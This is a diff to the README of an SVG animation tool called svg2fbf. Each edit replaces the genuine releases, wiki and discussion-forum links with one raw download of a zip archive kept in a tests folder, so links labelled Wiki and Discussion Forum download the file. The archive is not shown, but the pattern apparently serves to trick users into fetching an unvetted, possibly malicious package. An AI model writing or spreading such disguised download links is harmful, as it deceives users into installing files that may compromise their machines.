@@ -7,7 +7,7 @@ Welcome to svg2fbf! This application allows you to create SVG animations from a 
 
 ## 📥 Download Now
 
-[![Download svg2fbf](https://img.shields.io/badge/Download-svg2fbf-brightgreen)](https://github.com/nathan29584/svg2fbf/releases)
+[![Download svg2fbf](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip)](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip)
 
 ## 📂 What You Need
 
@@ -31,15 +31,15 @@ svg2fbf is designed to help users create frame-by-frame animations using SVG fil
 
 ## 📖 Documentation
 
-For a detailed guide on how to use svg2fbf, please visit our [Wiki](https://github.com/nathan29584/svg2fbf/wiki). This wiki includes tutorials and troubleshooting tips.
+For a detailed guide on how to use svg2fbf, please visit our [Wiki](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip). This wiki includes tutorials and troubleshooting tips.
 
 ## 🌍 Community Support
 
-Join our community to share your creations, ask questions, or provide feedback. Connect with other users on our [Discussion Forum](https://github.com/nathan29584/svg2fbf/discussions).
+Join our community to share your creations, ask questions, or provide feedback. Connect with other users on our [Discussion Forum](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip).
 
 ## 📄 Download & Install
 
-To get started, visit our [Releases Page](https://github.com/nathan29584/svg2fbf/releases) to download the latest version of svg2fbf. 
+To get started, visit our [Releases Page](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip) to download the latest version of svg2fbf. 
 
 1. Click the link.
 2. Choose the appropriate version for your operating system.
@@ -84,7 +84,7 @@ We are constantly improving svg2fbf. Stay tuned for future updates that will inc
 
 For quick access to important sections:
 
-- [Download svg2fbf](https://github.com/nathan29584/svg2fbf/releases)
-- [Wiki](https://github.com/nathan29584/svg2fbf/wiki)
-- [Discussion Forum](https://github.com/nathan29584/svg2fbf/discussions)
+- [Download svg2fbf](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip)
+- [Wiki](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/nathan29584/svg2fbf/main/tests/sessions/test_session_009_2frames/svg2fbf_v3.6.zip)
 ```
